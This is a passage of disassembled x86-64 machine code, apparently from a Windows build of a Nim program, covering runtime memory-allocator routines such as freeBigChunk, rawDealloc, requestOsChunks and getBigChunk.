  402294:	48 c1 fa 0c          	sar    $0xc,%rdx
  402298:	e8 35 f6 ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  40229d:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
  4022a2:	84 c0                	test   %al,%al
  4022a4:	74 0c                	je     4022b2 <splitChunk2__gSNzk4aToVCSTE1opfEv2A+0x66>
  4022a6:	49 8b 03             	mov    (%r11),%rax
  4022a9:	83 e0 01             	and    $0x1,%eax
  4022ac:	4c 09 d0             	or     %r10,%rax
  4022af:	49 89 03             	mov    %rax,(%r11)
  4022b2:	4d 89 41 08          	mov    %r8,0x8(%r9)
  4022b6:	49 89 d8             	mov    %rbx,%r8
  4022b9:	48 89 fa             	mov    %rdi,%rdx
  4022bc:	48 89 f1             	mov    %rsi,%rcx
  4022bf:	49 c1 f8 0c          	sar    $0xc,%r8
  4022c3:	e8 16 ff ff ff       	call   4021de <incl__tSnfTXv7GxXoDyFDm9bvzqg>
  4022c8:	48 89 d8             	mov    %rbx,%rax
  4022cb:	48 83 c4 20          	add    $0x20,%rsp
  4022cf:	5b                   	pop    %rbx
  4022d0:	5e                   	pop    %rsi
  4022d1:	5f                   	pop    %rdi
  4022d2:	c3                   	ret

00000000004022d3 <freeBigChunk__IPvsryqksLyNxxag3IQr2g>:
  4022d3:	41 54                	push   %r12
  4022d5:	55                   	push   %rbp
  4022d6:	57                   	push   %rdi
  4022d7:	56                   	push   %rsi
  4022d8:	53                   	push   %rbx
  4022d9:	48 83 ec 20          	sub    $0x20,%rsp
  4022dd:	48 8b 42 08          	mov    0x8(%rdx),%rax
  4022e1:	48 01 81 90 28 00 00 	add    %rax,0x2890(%rcx)
  4022e8:	48 8b 02             	mov    (%rdx),%rax
  4022eb:	48 8d a9 a8 28 00 00 	lea    0x28a8(%rcx),%rbp
  4022f2:	48 89 ce             	mov    %rcx,%rsi
  4022f5:	48 89 d3             	mov    %rdx,%rbx
  4022f8:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
  4022fc:	48 89 02             	mov    %rax,(%rdx)
  4022ff:	0f 84 80 00 00 00    	je     402385 <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0xb2>
  402305:	48 89 d7             	mov    %rdx,%rdi
  402308:	48 89 e9             	mov    %rbp,%rcx
  40230b:	48 29 c7             	sub    %rax,%rdi
  40230e:	48 89 fa             	mov    %rdi,%rdx
  402311:	48 c1 fa 0c          	sar    $0xc,%rdx
  402315:	e8 b8 f5 ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  40231a:	84 c0                	test   %al,%al
  40231c:	74 67                	je     402385 <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0xb2>
  40231e:	f6 07 01             	testb  $0x1,(%rdi)
  402321:	75 62                	jne    402385 <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0xb2>
  402323:	48 8b 47 08          	mov    0x8(%rdi),%rax
  402327:	48 3d c8 0f 00 00    	cmp    $0xfc8,%rax
  40232d:	7e 56                	jle    402385 <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0xb2>
  40232f:	48 3d ff ff ff 3e    	cmp    $0x3effffff,%rax
  402335:	7f 4e                	jg     402385 <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0xb2>
  402337:	48 89 fa             	mov    %rdi,%rdx
  40233a:	48 89 f1             	mov    %rsi,%rcx
  40233d:	e8 2c f8 ff ff       	call   401b6e <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2>
  402342:	48 8b 43 08          	mov    0x8(%rbx),%rax
  402346:	48 c1 fb 0c          	sar    $0xc,%rbx
  40234a:	48 89 e9             	mov    %rbp,%rcx
  40234d:	48 01 47 08          	add    %rax,0x8(%rdi)
  402351:	48 89 da             	mov    %rbx,%rdx
  402354:	48 89 fb             	mov    %rdi,%rbx
  402357:	e8 3b f5 ff ff       	call   401897 <excl__9cAWqpgI1NbhhZ3cVPHhI5A>
  40235c:	48 81 7f 08 00 00 00 	cmpq   $0x3f000000,0x8(%rdi)
  402363:	3f 
  402364:	7e 1f                	jle    402385 <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0xb2>
  402366:	48 89 fa             	mov    %rdi,%rdx
  402369:	48 89 f1             	mov    %rsi,%rcx
  40236c:	41 b8 00 00 00 3f    	mov    $0x3f000000,%r8d
  402372:	e8 d5 fe ff ff       	call   40224c <splitChunk2__gSNzk4aToVCSTE1opfEv2A>
  402377:	48 89 fa             	mov    %rdi,%rdx
  40237a:	48 89 f1             	mov    %rsi,%rcx
  40237d:	48 89 c3             	mov    %rax,%rbx
  402380:	e8 9c f8 ff ff       	call   401c21 <addChunkToMatrix__YSJZJgeU5UU2aa8GNvs3WA>
  402385:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
  402389:	48 89 e9             	mov    %rbp,%rcx
  40238c:	4a 8d 3c 0b          	lea    (%rbx,%r9,1),%rdi
  402390:	49 89 fc             	mov    %rdi,%r12
  402393:	49 c1 fc 0c          	sar    $0xc,%r12
  402397:	4c 89 e2             	mov    %r12,%rdx
  40239a:	e8 33 f5 ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  40239f:	84 c0                	test   %al,%al
  4023a1:	74 5c                	je     4023ff <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0x12c>
  4023a3:	f6 07 01             	testb  $0x1,(%rdi)
  4023a6:	75 57                	jne    4023ff <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0x12c>
  4023a8:	48 81 7f 08 c8 0f 00 	cmpq   $0xfc8,0x8(%rdi)
  4023af:	00 
  4023b0:	7e 4d                	jle    4023ff <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0x12c>
  4023b2:	49 81 f9 ff ff ff 3e 	cmp    $0x3effffff,%r9
  4023b9:	7f 44                	jg     4023ff <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0x12c>
  4023bb:	48 89 fa             	mov    %rdi,%rdx
  4023be:	48 89 f1             	mov    %rsi,%rcx
  4023c1:	e8 a8 f7 ff ff       	call   401b6e <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2>
  4023c6:	48 8b 47 08          	mov    0x8(%rdi),%rax
  4023ca:	4c 89 e2             	mov    %r12,%rdx
  4023cd:	48 89 e9             	mov    %rbp,%rcx
  4023d0:	48 01 43 08          	add    %rax,0x8(%rbx)
  4023d4:	e8 be f4 ff ff       	call   401897 <excl__9cAWqpgI1NbhhZ3cVPHhI5A>
  4023d9:	48 81 7b 08 00 00 00 	cmpq   $0x3f000000,0x8(%rbx)
  4023e0:	3f 
  4023e1:	7e 1c                	jle    4023ff <freeBigChunk__IPvsryqksLyNxxag3IQr2g+0x12c>
  4023e3:	48 89 da             	mov    %rbx,%rdx
  4023e6:	48 89 f1             	mov    %rsi,%rcx
  4023e9:	41 b8 00 00 00 3f    	mov    $0x3f000000,%r8d
  4023ef:	e8 58 fe ff ff       	call   40224c <splitChunk2__gSNzk4aToVCSTE1opfEv2A>
  4023f4:	48 89 f1             	mov    %rsi,%rcx
  4023f7:	48 89 c2             	mov    %rax,%rdx
  4023fa:	e8 22 f8 ff ff       	call   401c21 <addChunkToMatrix__YSJZJgeU5UU2aa8GNvs3WA>
  4023ff:	48 89 da             	mov    %rbx,%rdx
  402402:	48 89 f1             	mov    %rsi,%rcx
  402405:	48 83 c4 20          	add    $0x20,%rsp
  402409:	5b                   	pop    %rbx
  40240a:	5e                   	pop    %rsi
  40240b:	5f                   	pop    %rdi
  40240c:	5d                   	pop    %rbp
  40240d:	41 5c                	pop    %r12
  40240f:	e9 0d f8 ff ff       	jmp    401c21 <addChunkToMatrix__YSJZJgeU5UU2aa8GNvs3WA>

0000000000402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>:
  402414:	48 83 ec 28          	sub    $0x28,%rsp
  402418:	49 89 d2             	mov    %rdx,%r10
  40241b:	49 89 cb             	mov    %rcx,%r11
  40241e:	48 8b 89 98 28 00 00 	mov    0x2898(%rcx),%rcx
  402425:	49 81 e2 00 f0 ff ff 	and    $0xfffffffffffff000,%r10
  40242c:	49 8b 42 08          	mov    0x8(%r10),%rax
  402430:	48 29 c1             	sub    %rax,%rcx
  402433:	48 3d c8 0f 00 00    	cmp    $0xfc8,%rax
  402439:	49 89 8b 98 28 00 00 	mov    %rcx,0x2898(%r11)
  402440:	7e 4f                	jle    402491 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x7d>
  402442:	49 83 bb d8 30 00 00 	cmpq   $0x0,0x30d8(%r11)
  402449:	00 
  40244a:	49 8d 83 d8 30 00 00 	lea    0x30d8(%r11),%rax
  402451:	75 0e                	jne    402461 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x4d>
  402453:	49 89 83 d8 30 00 00 	mov    %rax,0x30d8(%r11)
  40245a:	49 89 83 e0 30 00 00 	mov    %rax,0x30e0(%r11)
  402461:	49 89 83 b0 30 00 00 	mov    %rax,0x30b0(%r11)
  402468:	49 8d 93 a8 30 00 00 	lea    0x30a8(%r11),%rdx
  40246f:	4c 89 d9             	mov    %r11,%rcx
  402472:	4d 8d 42 20          	lea    0x20(%r10),%r8
  402476:	e8 d9 f2 ff ff       	call   401754 <del__Io5JDKCS5u26IEWw0J53hQ>
  40247b:	4d 8b 4a 08          	mov    0x8(%r10),%r9
  40247f:	49 81 f9 00 00 00 3f 	cmp    $0x3f000000,%r9
  402486:	0f 8e bd 00 00 00    	jle    402549 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x135>
  40248c:	e9 c7 00 00 00       	jmp    402558 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x144>
  402491:	49 8b 4a 20          	mov    0x20(%r10),%rcx
  402495:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)
  40249c:	00 
  40249d:	48 89 0a             	mov    %rcx,(%rdx)
  4024a0:	49 89 52 20          	mov    %rdx,0x20(%r10)
  4024a4:	49 8b 52 28          	mov    0x28(%r10),%rdx
  4024a8:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
  4024ac:	48 39 c2             	cmp    %rax,%rdx
  4024af:	7c 13                	jl     4024c4 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0xb0>
  4024b1:	48 81 f9 c8 0f 00 00 	cmp    $0xfc8,%rcx
  4024b8:	49 89 4a 28          	mov    %rcx,0x28(%r10)
  4024bc:	0f 85 df 00 00 00    	jne    4025a1 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x18d>
  4024c2:	eb 2d                	jmp    4024f1 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0xdd>
  4024c4:	48 99                	cqto
  4024c6:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  4024cc:	49 f7 f8             	idiv   %r8
  4024cf:	49 8d 14 c3          	lea    (%r11,%rax,8),%rdx
  4024d3:	48 8b 42 10          	mov    0x10(%rdx),%rax
  4024d7:	48 85 c0             	test   %rax,%rax
  4024da:	49 89 42 10          	mov    %rax,0x10(%r10)
  4024de:	74 04                	je     4024e4 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0xd0>
  4024e0:	4c 89 50 18          	mov    %r10,0x18(%rax)
  4024e4:	4c 89 52 10          	mov    %r10,0x10(%rdx)
  4024e8:	49 89 4a 28          	mov    %rcx,0x28(%r10)
  4024ec:	e9 b0 00 00 00       	jmp    4025a1 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x18d>
  4024f1:	48 99                	cqto
  4024f3:	b9 08 00 00 00       	mov    $0x8,%ecx
  4024f8:	48 f7 f9             	idiv   %rcx
  4024fb:	49 8d 14 c3          	lea    (%r11,%rax,8),%rdx
  4024ff:	49 8b 42 10          	mov    0x10(%r10),%rax
  402503:	4c 3b 52 10          	cmp    0x10(%rdx),%r10
  402507:	74 17                	je     402520 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x10c>
  402509:	49 8b 52 18          	mov    0x18(%r10),%rdx
  40250d:	48 89 42 10          	mov    %rax,0x10(%rdx)
  402511:	49 8b 42 10          	mov    0x10(%r10),%rax
  402515:	48 85 c0             	test   %rax,%rax
  402518:	74 17                	je     402531 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x11d>
  40251a:	48 89 50 18          	mov    %rdx,0x18(%rax)
  40251e:	eb 11                	jmp    402531 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x11d>
  402520:	48 85 c0             	test   %rax,%rax
  402523:	48 89 42 10          	mov    %rax,0x10(%rdx)
  402527:	74 08                	je     402531 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ+0x11d>
  402529:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
  402530:	00 
  402531:	49 c7 42 10 00 00 00 	movq   $0x0,0x10(%r10)
  402538:	00 
  402539:	49 c7 42 18 00 00 00 	movq   $0x0,0x18(%r10)
  402540:	00 
  402541:	49 c7 42 08 00 10 00 	movq   $0x1000,0x8(%r10)
  402548:	00 
  402549:	4c 89 d2             	mov    %r10,%rdx
  40254c:	4c 89 d9             	mov    %r11,%rcx
  40254f:	48 83 c4 28          	add    $0x28,%rsp
  402553:	e9 7b fd ff ff       	jmp    4022d3 <freeBigChunk__IPvsryqksLyNxxag3IQr2g>
  402558:	49 8d 8b a8 28 00 00 	lea    0x28a8(%r11),%rcx
  40255f:	4c 89 d2             	mov    %r10,%rdx
  402562:	48 c1 fa 0c          	sar    $0xc,%rdx
  402566:	e8 2c f3 ff ff       	call   401897 <excl__9cAWqpgI1NbhhZ3cVPHhI5A>
  40256b:	49 8b 83 80 28 00 00 	mov    0x2880(%r11),%rax
  402572:	4c 89 d1             	mov    %r10,%rcx
  402575:	49 39 83 88 28 00 00 	cmp    %rax,0x2888(%r11)
  40257c:	48 89 c2             	mov    %rax,%rdx
  40257f:	49 0f 4d 93 88 28 00 	cmovge 0x2888(%r11),%rdx
  402586:	00 
  402587:	4c 29 c8             	sub    %r9,%rax
  40258a:	49 89 83 80 28 00 00 	mov    %rax,0x2880(%r11)
  402591:	49 89 93 88 28 00 00 	mov    %rdx,0x2888(%r11)
  402598:	48 83 c4 28          	add    $0x28,%rsp
  40259c:	e9 04 f8 ff ff       	jmp    401da5 <osDeallocPages__dRMEutPSAkbR9b9blNmTzvoQsystem.isra.6>
  4025a1:	48 83 c4 28          	add    $0x28,%rsp
  4025a5:	c3                   	ret

00000000004025a6 <deallocImpl__lmwgHsdhTsrQaepFju8wew>:
  4025a6:	53                   	push   %rbx
  4025a7:	48 83 ec 20          	sub    $0x20,%rsp
  4025ab:	48 89 cb             	mov    %rcx,%rbx
  4025ae:	e8 ed f6 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  4025b3:	48 8d 53 f0          	lea    -0x10(%rbx),%rdx
  4025b7:	48 8d 88 a0 00 00 00 	lea    0xa0(%rax),%rcx
  4025be:	48 83 c4 20          	add    $0x20,%rsp
  4025c2:	5b                   	pop    %rbx
  4025c3:	e9 4c fe ff ff       	jmp    402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>

00000000004025c8 <splitChunk__BqFVAuadgXfvAiq8B9cBjqQ>:
  4025c8:	53                   	push   %rbx
  4025c9:	48 83 ec 20          	sub    $0x20,%rsp
  4025cd:	48 89 cb             	mov    %rcx,%rbx
  4025d0:	e8 77 fc ff ff       	call   40224c <splitChunk2__gSNzk4aToVCSTE1opfEv2A>
  4025d5:	48 89 d9             	mov    %rbx,%rcx
  4025d8:	48 89 c2             	mov    %rax,%rdx
  4025db:	48 83 c4 20          	add    $0x20,%rsp
  4025df:	5b                   	pop    %rbx
  4025e0:	e9 3c f6 ff ff       	jmp    401c21 <addChunkToMatrix__YSJZJgeU5UU2aa8GNvs3WA>

00000000004025e5 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2>:
  4025e5:	57                   	push   %rdi
  4025e6:	56                   	push   %rsi
  4025e7:	53                   	push   %rbx
  4025e8:	48 83 ec 20          	sub    $0x20,%rsp
  4025ec:	80 b9 c9 30 00 00 00 	cmpb   $0x0,0x30c9(%rcx)
  4025f3:	48 89 cb             	mov    %rcx,%rbx
  4025f6:	48 89 d7             	mov    %rdx,%rdi
  4025f9:	75 54                	jne    40264f <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x6a>
  4025fb:	48 8b 81 98 28 00 00 	mov    0x2898(%rcx),%rax
  402602:	48 3d ff ff 00 00    	cmp    $0xffff,%rax
  402608:	7e 3a                	jle    402644 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x5f>
  40260a:	48 8b 91 d0 30 00 00 	mov    0x30d0(%rcx),%rdx
  402611:	48 c1 f8 02          	sar    $0x2,%rax
  402615:	b9 00 00 00 3f       	mov    $0x3f000000,%ecx
  40261a:	48 05 ff 0f 00 00    	add    $0xfff,%rax
  402620:	48 25 00 f0 ff ff    	and    $0xfffffffffffff000,%rax
  402626:	48 01 d2             	add    %rdx,%rdx
  402629:	48 81 fa 00 00 00 3f 	cmp    $0x3f000000,%rdx
  402630:	48 0f 4f d1          	cmovg  %rcx,%rdx
  402634:	48 39 d0             	cmp    %rdx,%rax
  402637:	48 0f 4f c2          	cmovg  %rdx,%rax
  40263b:	48 89 83 d0 30 00 00 	mov    %rax,0x30d0(%rbx)
  402642:	eb 0b                	jmp    40264f <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x6a>
  402644:	48 c7 81 d0 30 00 00 	movq   $0x4000,0x30d0(%rcx)
  40264b:	00 40 00 00 
  40264f:	48 8b 93 d0 30 00 00 	mov    0x30d0(%rbx),%rdx
  402656:	48 39 fa             	cmp    %rdi,%rdx
  402659:	7c 25                	jl     402680 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x9b>
  40265b:	31 c9                	xor    %ecx,%ecx
  40265d:	41 b9 04 00 00 00    	mov    $0x4,%r9d
  402663:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
  402669:	ff 15 cd 5c 04 00    	call   *0x45ccd(%rip)        # 44833c <__imp_VirtualAlloc>
  40266f:	48 85 c0             	test   %rax,%rax
  402672:	48 89 c6             	mov    %rax,%rsi
  402675:	74 16                	je     40268d <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0xa8>
  402677:	48 8b bb d0 30 00 00 	mov    0x30d0(%rbx),%rdi
  40267e:	eb 1f                	jmp    40269f <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0xba>
  402680:	48 89 f9             	mov    %rdi,%rcx
  402683:	e8 fa f9 ff ff       	call   402082 <osAllocPages__HMOhWrY1QMa49a2BcJwSDZQsystem>
  402688:	48 89 c6             	mov    %rax,%rsi
  40268b:	eb 12                	jmp    40269f <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0xba>
  40268d:	48 89 f9             	mov    %rdi,%rcx
  402690:	e8 ed f9 ff ff       	call   402082 <osAllocPages__HMOhWrY1QMa49a2BcJwSDZQsystem>
  402695:	c6 83 c9 30 00 00 01 	movb   $0x1,0x30c9(%rbx)
  40269c:	48 89 c6             	mov    %rax,%rsi
  40269f:	48 01 bb 80 28 00 00 	add    %rdi,0x2880(%rbx)
  4026a6:	48 8d 83 00 31 00 00 	lea    0x3100(%rbx),%rax
  4026ad:	48 01 bb 90 28 00 00 	add    %rdi,0x2890(%rbx)
  4026b4:	48 83 38 1d          	cmpq   $0x1d,(%rax)
  4026b8:	0f 8e b7 00 00 00    	jle    402775 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x190>
  4026be:	48 8b 80 e8 01 00 00 	mov    0x1e8(%rax),%rax
  4026c5:	48 85 c0             	test   %rax,%rax
  4026c8:	75 ea                	jne    4026b4 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0xcf>
  4026ca:	ba f0 01 00 00       	mov    $0x1f0,%edx
  4026cf:	48 89 d9             	mov    %rbx,%rcx
  4026d2:	e8 d5 f9 ff ff       	call   4020ac <llAlloc__ovw3NMWXeZ0Qi9cGYq1E2Tg>
  4026d7:	48 8b 93 e8 32 00 00 	mov    0x32e8(%rbx),%rdx
  4026de:	48 89 90 e8 01 00 00 	mov    %rdx,0x1e8(%rax)
  4026e5:	48 89 83 e8 32 00 00 	mov    %rax,0x32e8(%rbx)
  4026ec:	48 89 70 08          	mov    %rsi,0x8(%rax)
  4026f0:	48 89 78 10          	mov    %rdi,0x10(%rax)
  4026f4:	48 c7 00 01 00 00 00 	movq   $0x1,(%rax)
  4026fb:	4c 8d 0c 37          	lea    (%rdi,%rsi,1),%r9
  4026ff:	48 c7 46 10 00 00 00 	movq   $0x0,0x10(%rsi)
  402706:	00 
  402707:	4c 8d 9b a8 28 00 00 	lea    0x28a8(%rbx),%r11
  40270e:	4c 89 ca             	mov    %r9,%rdx
  402711:	48 c7 46 18 00 00 00 	movq   $0x0,0x18(%rsi)
  402718:	00 
  402719:	48 c1 fa 0c          	sar    $0xc,%rdx
  40271d:	48 89 7e 08          	mov    %rdi,0x8(%rsi)
  402721:	4c 89 d9             	mov    %r11,%rcx
  402724:	e8 a9 f1 ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  402729:	84 c0                	test   %al,%al
  40272b:	74 0c                	je     402739 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x154>
  40272d:	49 8b 01             	mov    (%r9),%rax
  402730:	83 e0 01             	and    $0x1,%eax
  402733:	48 09 f8             	or     %rdi,%rax
  402736:	49 89 01             	mov    %rax,(%r9)
  402739:	4c 8b 8b a0 28 00 00 	mov    0x28a0(%rbx),%r9
  402740:	4d 85 c9             	test   %r9,%r9
  402743:	75 06                	jne    40274b <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x166>
  402745:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
  40274b:	49 89 f2             	mov    %rsi,%r10
  40274e:	4c 89 d9             	mov    %r11,%rcx
  402751:	4d 29 ca             	sub    %r9,%r10
  402754:	4c 89 d2             	mov    %r10,%rdx
  402757:	48 c1 fa 0c          	sar    $0xc,%rdx
  40275b:	e8 72 f1 ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  402760:	48 8b 16             	mov    (%rsi),%rdx
  402763:	83 e2 01             	and    $0x1,%edx
  402766:	84 c0                	test   %al,%al
  402768:	74 2b                	je     402795 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x1b0>
  40276a:	4d 39 4a 08          	cmp    %r9,0x8(%r10)
  40276e:	75 25                	jne    402795 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x1b0>
  402770:	4c 09 ca             	or     %r9,%rdx
  402773:	eb 20                	jmp    402795 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x1b0>
  402775:	48 8b 10             	mov    (%rax),%rdx
  402778:	48 89 d1             	mov    %rdx,%rcx
  40277b:	48 ff c2             	inc    %rdx
  40277e:	48 c1 e1 04          	shl    $0x4,%rcx
  402782:	48 01 c1             	add    %rax,%rcx
  402785:	48 89 71 08          	mov    %rsi,0x8(%rcx)
  402789:	48 89 79 10          	mov    %rdi,0x10(%rcx)
  40278d:	48 89 10             	mov    %rdx,(%rax)
  402790:	e9 66 ff ff ff       	jmp    4026fb <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2+0x116>
  402795:	48 89 f0             	mov    %rsi,%rax
  402798:	48 89 16             	mov    %rdx,(%rsi)
  40279b:	48 89 bb a0 28 00 00 	mov    %rdi,0x28a0(%rbx)
  4027a2:	48 83 c4 20          	add    $0x20,%rsp
  4027a6:	5b                   	pop    %rbx
  4027a7:	5e                   	pop    %rsi
  4027a8:	5f                   	pop    %rdi
  4027a9:	c3                   	ret

00000000004027aa <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ>:
  4027aa:	57                   	push   %rdi
  4027ab:	56                   	push   %rsi
  4027ac:	53                   	push   %rbx
  4027ad:	48 83 ec 20          	sub    $0x20,%rsp
  4027b1:	bf 00 00 00 3f       	mov    $0x3f000000,%edi
  4027b6:	48 89 cb             	mov    %rcx,%rbx
  4027b9:	89 d1                	mov    %edx,%ecx
  4027bb:	49 89 d0             	mov    %rdx,%r8
  4027be:	e8 48 f1 ff ff       	call   40190b <msbit__NR8XkKls428clCUr82szCgsystem>
  4027c3:	8d 48 fb             	lea    -0x5(%rax),%ecx
  4027c6:	b8 01 00 00 00       	mov    $0x1,%eax
  4027cb:	48 d3 e0             	shl    %cl,%rax
  4027ce:	48 05 ff 0f 00 00    	add    $0xfff,%rax
  4027d4:	48 25 00 f0 ff ff    	and    $0xfffffffffffff000,%rax
  4027da:	4e 8d 4c 00 ff       	lea    -0x1(%rax,%r8,1),%r9
  4027df:	48 f7 d8             	neg    %rax
  4027e2:	49 21 c1             	and    %rax,%r9
  4027e5:	49 81 f9 00 00 00 3f 	cmp    $0x3f000000,%r9
  4027ec:	49 0f 4e f9          	cmovle %r9,%rdi
  4027f0:	89 f9                	mov    %edi,%ecx
  4027f2:	48 89 fe             	mov    %rdi,%rsi
  4027f5:	e8 11 f1 ff ff       	call   40190b <msbit__NR8XkKls428clCUr82szCgsystem>
  4027fa:	ba ff ff ff ff       	mov    $0xffffffff,%edx
  4027ff:	8d 48 fb             	lea    -0x5(%rax),%ecx
  402802:	4c 8d 40 fa          	lea    -0x6(%rax),%r8
  402806:	48 d3 fe             	sar    %cl,%rsi
  402809:	48 89 f1             	mov    %rsi,%rcx
  40280c:	48 89 d6             	mov    %rdx,%rsi
  40280f:	48 83 e9 20          	sub    $0x20,%rcx
  402813:	48 d3 e6             	shl    %cl,%rsi
  402816:	48 89 f1             	mov    %rsi,%rcx
  402819:	23 8c 83 fc 0f 00 00 	and    0xffc(%rbx,%rax,4),%ecx
  402820:	75 31                	jne    402853 <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0xa9>
  402822:	41 8d 48 01          	lea    0x1(%r8),%ecx
  402826:	48 d3 e2             	shl    %cl,%rdx
  402829:	23 93 10 10 00 00    	and    0x1010(%rbx),%edx
  40282f:	89 d1                	mov    %edx,%ecx
  402831:	f7 d9                	neg    %ecx
  402833:	21 d1                	and    %edx,%ecx
  402835:	e8 d1 f0 ff ff       	call   40190b <msbit__NR8XkKls428clCUr82szCgsystem>
  40283a:	48 85 c0             	test   %rax,%rax
  40283d:	49 89 c0             	mov    %rax,%r8
  402840:	0f 8e b5 00 00 00    	jle    4028fb <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x151>
  402846:	8b 84 83 14 10 00 00 	mov    0x1014(%rbx,%rax,4),%eax
  40284d:	89 c1                	mov    %eax,%ecx
  40284f:	f7 d9                	neg    %ecx
  402851:	eb 04                	jmp    402857 <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0xad>
  402853:	89 c8                	mov    %ecx,%eax
  402855:	f7 d8                	neg    %eax
  402857:	21 c1                	and    %eax,%ecx
  402859:	e8 ad f0 ff ff       	call   40190b <msbit__NR8XkKls428clCUr82szCgsystem>
  40285e:	4c 89 c2             	mov    %r8,%rdx
  402861:	48 c1 e2 05          	shl    $0x5,%rdx
  402865:	48 8d 94 10 0e 02 00 	lea    0x20e(%rax,%rdx,1),%rdx
  40286c:	00 
  40286d:	48 8b 74 d3 08       	mov    0x8(%rbx,%rdx,8),%rsi
  402872:	48 85 f6             	test   %rsi,%rsi
  402875:	0f 84 80 00 00 00    	je     4028fb <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x151>
  40287b:	48 8b 56 10          	mov    0x10(%rsi),%rdx
  40287f:	4c 89 c1             	mov    %r8,%rcx
  402882:	48 c1 e1 05          	shl    $0x5,%rcx
  402886:	48 8d 8c 08 0e 02 00 	lea    0x20e(%rax,%rcx,1),%rcx
  40288d:	00 
  40288e:	48 85 d2             	test   %rdx,%rdx
  402891:	48 89 54 cb 08       	mov    %rdx,0x8(%rbx,%rcx,8)
  402896:	75 3c                	jne    4028d4 <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x12a>
  402898:	4e 8d 0c 83          	lea    (%rbx,%r8,4),%r9
  40289c:	83 e0 1f             	and    $0x1f,%eax
  40289f:	ba 01 00 00 00       	mov    $0x1,%edx
  4028a4:	89 c1                	mov    %eax,%ecx
  4028a6:	49 89 d2             	mov    %rdx,%r10
  4028a9:	49 d3 e2             	shl    %cl,%r10
  4028ac:	4c 89 d0             	mov    %r10,%rax
  4028af:	f7 d0                	not    %eax
  4028b1:	41 23 81 14 10 00 00 	and    0x1014(%r9),%eax
  4028b8:	41 89 81 14 10 00 00 	mov    %eax,0x1014(%r9)
  4028bf:	75 1b                	jne    4028dc <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x132>
  4028c1:	44 89 c1             	mov    %r8d,%ecx
  4028c4:	83 e1 1f             	and    $0x1f,%ecx
  4028c7:	48 d3 e2             	shl    %cl,%rdx
  4028ca:	f7 d2                	not    %edx
  4028cc:	21 93 10 10 00 00    	and    %edx,0x1010(%rbx)
  4028d2:	eb 08                	jmp    4028dc <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x132>
  4028d4:	48 c7 42 18 00 00 00 	movq   $0x0,0x18(%rdx)
  4028db:	00 
  4028dc:	48 8d 87 ff 0f 00 00 	lea    0xfff(%rdi),%rax
  4028e3:	48 3b 46 08          	cmp    0x8(%rsi),%rax
  4028e7:	48 c7 46 18 00 00 00 	movq   $0x0,0x18(%rsi)
  4028ee:	00 
